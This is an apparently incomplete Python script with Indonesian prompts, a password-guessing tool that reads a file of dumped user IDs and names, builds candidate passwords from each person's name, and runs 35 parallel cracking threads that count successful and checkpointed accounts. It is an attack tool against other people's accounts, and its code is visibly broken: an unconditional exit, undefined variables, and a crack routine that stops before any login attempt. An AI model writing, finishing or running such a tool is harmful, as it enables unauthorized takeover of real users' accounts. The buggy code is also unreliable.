import os,sys
from time import sleep
from rich.console import Console
from rich.panel import Panel
from concurrent.futures import ThreadPoolExecutor as tred

###-----[ BAGIAN COLOR ]-----###
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'

class DUMPX:
    def __init__(self):
        self.plist = []
        self.loop,self.cps,self.oks = 0,[],[]

    def dump_file(self):
        Console(width=50, style="bold green").print(Panel("[italic white]Masukan File Dump ID[italic white]\n[bold red]Contoh : dump.txt[italic white]",subtitle="╭───",subtitle_align="left"))
        file = Console().input("[bold green]   ╰─> ")
        try:
            fore = open(file,'r').read().splitlines()
        except FileNotFoundError:Console(width=50, style="bold green").print(Panel("[italic white]File Tidak Ditemukan[italic white]"))
        exit(sleep(2))
        Console(width=50, style="bold green").print(Panel("[italic white]1. Validate[italic white]",subtitle="╭───",subtitle_align="left"))
        mthd = Console().input("[bold green]   ╰─> ")
        try:pw_limit = int(input("Password Limit : "))
        except:pw_limit = 1
        Console(width=50, style="bold green").print(Panel("[bold red]Contoh[/] : [bold green]first last,firstlast,first123[italic white]",subtitle="╭───",subtitle_align="left"))
        for i in range(pw_limit):
            self.plist.append(Console().input(f"[bold green]   ╰─> {i+1} "))
        with tred(max_workers=35) as pool:
            for i in fore:
                try:
                    uid,name = i.split('|')
                    first = name.split(' ')
                    if len(first) == 3 or len(first) == 4 or len(first) == 5 or len(first) == 6:
                        pwx = pw
                    else:
                        pwx = pw
                        if 'validate' in mthd:
                            pool.submit(self.crack,validate,uid,name,pwx)
                        else:
                            pool.submit(self.crack,uid,name,pwx)
                except:pass

    def crack(self,uid,name,pwx):
        sys.stdout.write(f"\r*--> {str(self.loop)} {H}OK{P} : {H}{str(self.oks)}{P} {K}CP{P} : {K}{str(self.cps)}{P}"),
        sys.stdout.flush()
        fn = name.split(' ')[0]
        try:ln = name.split(' ')[1]
        except:ln = fn
        for pw in pwx:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
            